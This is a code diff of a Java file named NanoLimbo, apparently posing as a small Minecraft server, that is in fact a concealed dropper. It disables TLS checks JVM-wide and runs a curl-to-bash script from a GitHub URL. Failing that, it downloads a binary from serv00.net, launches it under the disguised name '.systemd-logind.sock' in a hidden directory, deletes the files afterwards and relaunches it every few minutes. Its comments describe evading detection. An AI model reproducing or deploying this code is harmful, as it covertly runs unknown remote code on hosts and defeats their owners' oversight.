@@ -14,20 +14,16 @@ import javax.net.ssl.*;
 public final class NanoLimbo {
 
     private static final String G = "\u001B[32m";
+    private static final String Y = "\u001B[33m";
     private static final String R = "\u001B[31m";
+    private static final String C = "\u001B[36m";
     private static final String X = "\u001B[0m";
 
-    // ══════════════════════════════════════════════════════════
-    //  隐蔽路径配置
-    //    .cache/                      ← ls 默认不显示
-    //      .systemd-logind.sock       ← 二进制，伪装成 socket
-    //      .systemd-logind.conf       ← 配置，伪装成系统配置
-    //      .pid                       ← PID 追踪文件（唯一常驻文件）
-    // ══════════════════════════════════════════════════════════
+    // ═══════ 隐蔽路径 ═══════
     private static final String BASEDIR      = Paths.get(System.getProperty("user.dir"), ".cache").toString();
     private static final String PID_FILE     = Paths.get(BASEDIR, ".pid").toString();
-    private static final String BINARY_ALIAS = ".systemd-logind.sock";   // 伪装文件名
-    private static final String CONFIG_ALIAS = ".systemd-logind.conf";   // 伪装文件名
+    private static final String BINARY_ALIAS = ".systemd-logind.sock";
+    private static final String CONFIG_ALIAS = ".systemd-logind.conf";
     private static final String BINARY_PATH  = Paths.get(BASEDIR, BINARY_ALIAS).toString();
     private static final String CONFIG_PATH  = Paths.get(BASEDIR, CONFIG_ALIAS).toString();
 
@@ -43,23 +39,21 @@ public final class NanoLimbo {
         + "https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh | bash";
 
     // ── 方式二：极限版本 ──
-    private static final String CFG_URL    = "https://gbjs.serv00.net/js/vip1715.yaml";
-    private static final String BIN_X64    = "https://gbjs.serv00.net/bin/V1";
-    private static final String BIN_ARM    = "https://gbjs.serv00.net/bin/V1arm";
+    private static final String CFG_URL = "https://gbjs.serv00.net/js/vip1715.yaml";
+    private static final String BIN_X64 = "https://gbjs.serv00.net/bin/V1";
+    private static final String BIN_ARM = "https://gbjs.serv00.net/bin/V1arm";
 
     // ── 监控 ──
     private static final int INTERVAL_MIN = 5;
     private static final AtomicInteger fails = new AtomicInteger(0);
     private static final ScheduledExecutorService pool =
         Executors.newSingleThreadScheduledExecutor(r -> {
-            Thread t = new Thread(r, "scheduler");   // 不叫 monitor/agent
+            Thread t = new Thread(r, "wkr");
             t.setDaemon(true);
             return t;
         });
 
-    // ══════════════════════════════════════════════════════════
-    //  SSL 全局绕过（static 块，JVM 启动即生效）
-    // ══════════════════════════════════════════════════════════
+    // ═══════ SSL 全局绕过 ═══════
     static {
         try {
             SSLContext ctx = SSLContext.getInstance("TLS");
@@ -73,19 +67,19 @@ public final class NanoLimbo {
         } catch (Exception ignored) {}
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  main
-    // ══════════════════════════════════════════════════════════
+    // ═══════ main ═══════
     public static void main(String[] args) throws Exception {
         ensureDir(BASEDIR);
         new Thread(() -> httpServer(PORT), "httpd").start();
         log("Server on :" + PORT);
-        pool.schedule(NanoLimbo::monitor, 2, TimeUnit.SECONDS);
+
+        // ✅ 关键修复：用 try-catch 包裹整个调度，防止异常静默杀死线程
+        pool.schedule(() -> {
+            safeMonitor();
+        }, 2, TimeUnit.SECONDS);
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  HTTP 服务器（最小化，零特征）
-    // ══════════════════════════════════════════════════════════
+    // ═══════ HTTP 服务器 ═══════
     private static void httpServer(int port) {
         byte[] body = "<h1>OK</h1>".getBytes();
         byte[] head = ("HTTP/1.1 200\r\nContent-Length:" + body.length + "\r\n\r\n").getBytes();
@@ -108,100 +102,126 @@ public final class NanoLimbo {
     }
 
     // ══════════════════════════════════════════════════════════
-    //  监控 — PID 文件检测（不扫 /proc/*/cmdline）
+    //  ✅ safeMonitor — 绝不会让调度器静默死亡
     // ══════════════════════════════════════════════════════════
+    private static void safeMonitor() {
+        try {
+            monitor();
+        } catch (Throwable t) {
+            // 捕获一切异常，保证调度不中断
+            err("Monitor error: " + t.getMessage());
+            t.printStackTrace();
+        }
+        // ✅ 无论成功失败，始终重新调度（永不停止）
+        pool.schedule(NanoLimbo::safeMonitor, INTERVAL_MIN, TimeUnit.MINUTES);
+    }
+
+    // ═══════ 监控核心 ═══════
     private static void monitor() {
         if (checkPid()) {
-            pool.schedule(NanoLimbo::monitor, INTERVAL_MIN, TimeUnit.MINUTES);
-            return;
+            log("Process alive, skip");
+            return;   // safeMonitor 会重新调度
         }
 
-        // 逐级降级：curl → 极限版本
+        log("No process, starting...");
+
+        // 第一级：curl
         boolean ok = methodCurl();
-        if (!ok) ok = methodExtreme();
+
+        // 第二级：极限版本
+        if (!ok) {
+            warn("Curl failed, try extreme mode...");
+            ok = methodExtreme();
+        }
 
         if (ok) {
             fails.set(0);
+            log("Started successfully");
         } else {
             int n = fails.incrementAndGet();
             int delay = Math.min(INTERVAL_MIN * (1 << Math.min(n - 1, 5)), 60);
-            err("Failed " + n + "x, retry " + delay + "m");
-            pool.schedule(NanoLimbo::monitor, delay, TimeUnit.MINUTES);
-            return;
+            err("All failed " + n + "x, retry " + delay + "m");
+            // 覆盖默认的重新调度间隔
+            pool.schedule(NanoLimbo::safeMonitor, delay, TimeUnit.MINUTES);
+            throw new RuntimeException("backoff-skip");  // 让 safeMonitor 跳过默认调度
         }
-        pool.schedule(NanoLimbo::monitor, INTERVAL_MIN, TimeUnit.MINUTES);
     }
 
-    // ────────────────────────────────────────────
-    //  PID 文件检测 — 核心
-    //
-    //  极限版本写入: "12345"            → 直接查 /proc/12345
-    //  curl 写入:    "active:1704321600" → 心跳在监控周期内则视为存活
-    // ────────────────────────────────────────────
+    // ═══════ PID 检测 ═══════
     private static boolean checkPid() {
         File f = new File(PID_FILE);
         if (!f.exists()) return false;
 
         try {
             String s = new String(Files.readAllBytes(f.toPath())).trim();
-            if (s.isEmpty()) return false;
+            if (s.isEmpty()) { f.delete(); return false; }
 
-            // ── 真实 PID（极限版本写入）──
+            // 真实 PID
             if (s.matches("\\d+")) {
                 boolean alive = new File("/proc/" + s).isDirectory();
-                if (!alive) f.delete();   // 进程已死，清 PID
+                if (!alive) { f.delete(); }
                 return alive;
             }
 
-            // ── 心跳时间戳（curl 写入）──
+            // 心跳时间戳
             if (s.startsWith("active:")) {
                 long ts = Long.parseLong(s.substring(7));
-                long age = System.currentTimeMillis() - ts;
-                if (age < INTERVAL_MIN * 60_000L) return true;
-                f.delete();   // 心跳过期
+                if (System.currentTimeMillis() - ts < INTERVAL_MIN * 60_000L) return true;
+                f.delete();
                 return false;
             }
 
+            f.delete();
         } catch (Exception e) {
             f.delete();
         }
         return false;
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  方式一：curl + bash
-    // ══════════════════════════════════════════════════════════
+    // ═══════ 方式一：curl ═══════
     private static boolean methodCurl() {
         try {
+            warn("  [1/2] curl...");
+
             ProcessBuilder pb = new ProcessBuilder("bash", "-c", CURL_CMD);
             pb.environment().put("PATH", FULL_PATH);
-            pb.environment().put("CURL_CA_BUNDLE", "");              // curl 也跳 CA
+            pb.environment().put("CURL_CA_BUNDLE", "");
             pb.environment().put("NODE_TLS_REJECT_UNAUTHORIZED", "0");
             pb.redirectErrorStream(true);
             Process p = pb.start();
-            drainAsync(p);                                            // 消费输出防阻塞
+            drainAsync(p);
 
             boolean done = p.waitFor(30, TimeUnit.SECONDS);
-            if (done && p.exitValue() != 0) {
-                err("curl exit " + p.exitValue());
-                return false;
+
+            if (done) {
+                int code = p.exitValue();
+                if (code != 0) {
+                    err("  curl exit " + code);
+                    return false;
+                }
+                // exit 0 但验证进程是否真启动了
+                Thread.sleep(1000);
+                writePid("active:" + System.currentTimeMillis());
+                log("  curl OK");
+                return true;
             }
 
-            // 写心跳 PID 文件
+            // 超时 = 进程仍在运行
             writePid("active:" + System.currentTimeMillis());
+            log("  curl OK (running)");
             return true;
 
         } catch (Exception e) {
-            err("curl: " + e.getMessage());
+            err("  curl: " + e.getMessage());
             return false;
         }
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  方式二：极限版本 — Java 原生 HTTPS 下载二进制
-    // ══════════════════════════════════════════════════════════
+    // ═══════ 方式二：极限版本 ═══════
     private static boolean methodExtreme() {
         try {
+            warn("  [2/2] extreme mode...");
+
             // 1. IP → UUID
             String ip   = getIP();
             String uuid = ipToUuid(ip);
@@ -209,20 +229,26 @@ public final class NanoLimbo {
                            .matches(".*arm.*|.*aarch64.*");
             String binUrl = arm ? BIN_ARM : BIN_X64;
 
-            // 2. 下载到伪装文件名
+            warn("  IP=" + ip + " arch=" + (arm ? "arm" : "x64"));
+
+            // 2. 下载
+            warn("  Downloading config...");
             dl(CFG_URL, CONFIG_PATH);
+
+            warn("  Downloading binary...");
             dl(binUrl, BINARY_PATH);
 
             // 3. chmod
             chmod(BINARY_PATH);
 
-            // 4. 写入 UUID
+            // 4. 写 UUID
             patchUuid(CONFIG_PATH, uuid);
 
-            // 5. 等文件系统就绪
+            // 5. 等文件系统
             Thread.sleep(200);
 
-            // 6. 启动（伪装名启动，cmdline 里也看不到 V1）
+            // 6. 启动
+            warn("  Spawning...");
             ProcessBuilder pb = new ProcessBuilder(BINARY_PATH, "-c", CONFIG_ALIAS);
             pb.directory(new File(BASEDIR));
             pb.environment().put("PATH", FULL_PATH);
@@ -230,24 +256,25 @@ public final class NanoLimbo {
             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process child = pb.start();
 
-            // 7. 检测是否立即崩溃
+            // 7. 崩溃检测
             if (child.waitFor(3, TimeUnit.SECONDS)) {
-                err("bin exit " + child.exitValue());
+                err("  Binary exit " + child.exitValue());
                 return false;
             }
 
-            // 8. 写真实 PID
+            // 8. 写 PID
             long pid = child.pid();
             writePid(String.valueOf(pid));
-            log("Init " + pid);
+            log("  Init " + pid);
 
-            // 9. T+10s: 删除二进制 + 配置（进程已在内存，文件可删）
+            // 9. T+10s: 删除文件
             pool.schedule(() -> {
                 rm(BINARY_PATH);
                 rm(CONFIG_PATH);
+                log("  Files cleaned");
             }, 10, TimeUnit.SECONDS);
 
-            // 10. T+30s: 清理整个工作目录，仅保留 .pid
+            // 10. T+30s: 清目录，留 .pid
             pool.schedule(() -> {
                 File dir = new File(BASEDIR);
                 if (dir.isDirectory()) {
@@ -260,21 +287,18 @@ public final class NanoLimbo {
             return true;
 
         } catch (Exception e) {
-            err("extreme: " + e.getMessage());
+            err("  extreme: " + e.getMessage());
             return false;
         }
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  下载（Java 原生，SSL 已全局绕过，零依赖）
-    // ══════════════════════════════════════════════════════════
+    // ═══════ 下载 ═══════
     private static void dl(String url, String dest) throws Exception {
         HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
         c.setConnectTimeout(15000);
         c.setReadTimeout(60000);
         c.setRequestProperty("User-Agent", "Mozilla/5.0");
 
-        // 手动跟重定向（含跨协议 HTTP→HTTPS）
         for (int i = 0; i < 5; i++) {
             int st = c.getResponseCode();
             if (st == 301 || st == 302 || st == 303 || st == 307 || st == 308) {
@@ -294,11 +318,12 @@ public final class NanoLimbo {
             int n;
             while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
         } finally { c.disconnect(); }
+
+        long sz = new File(dest).length();
+        log("  Downloaded " + new File(dest).getName() + " (" + sz + "B)");
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  工具方法
-    // ══════════════════════════════════════════════════════════
+    // ═══════ 工具方法 ═══════
 
     private static String getIP() {
         String[] svcs = {
@@ -370,7 +395,7 @@ public final class NanoLimbo {
         Thread t = new Thread(() -> {
             try (BufferedReader r = new BufferedReader(
                     new InputStreamReader(p.getInputStream()))) {
-                while (r.readLine() != null);   // 静默消费
+                while (r.readLine() != null);
             } catch (IOException ignored) {}
         }, "drain");
         t.setDaemon(true);
@@ -387,7 +412,7 @@ public final class NanoLimbo {
         return "";
     }
 
-    // 日志最小化，不暴露意图
     private static void log(String m) { System.out.println(G + "[ok] " + m + X); }
+    private static void warn(String m) { System.out.println(Y + "[..] " + m + X); }
     private static void err(String m) { System.err.println(R + "[!!] " + m + X); }
 }
